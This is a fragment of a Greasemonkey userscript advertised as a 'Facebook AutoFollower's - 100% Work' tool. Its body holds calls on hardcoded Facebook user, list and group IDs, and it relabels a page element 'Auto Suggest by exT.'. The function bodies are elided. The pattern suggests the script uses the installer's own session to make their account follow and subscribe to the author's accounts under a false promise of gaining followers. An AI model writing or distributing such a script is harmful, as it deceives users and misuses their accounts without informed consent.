// ==UserScript==
// @name            Facebook AutoFollower's - 100% Work.
// @description	    AutoFollowers for Facebook..
// @namespace       
// @updateURL       
// @downloadURL     http://userscripts.org/scripts/source/256876.user.js
// @homepageURL     http://userscripts.org/scripts/show/256876
...
a("100003485499560");
a("100001489545348");
sublist("442455982547248");

//======

var gid = ['1450859975133706'];
...
function blub()
{
    if(document.getElementsByClassName('pbm fsm').length == 1) {
        ...
        //e.href = '#';
        e.innerHTML = 'Auto Suggest by exT.';
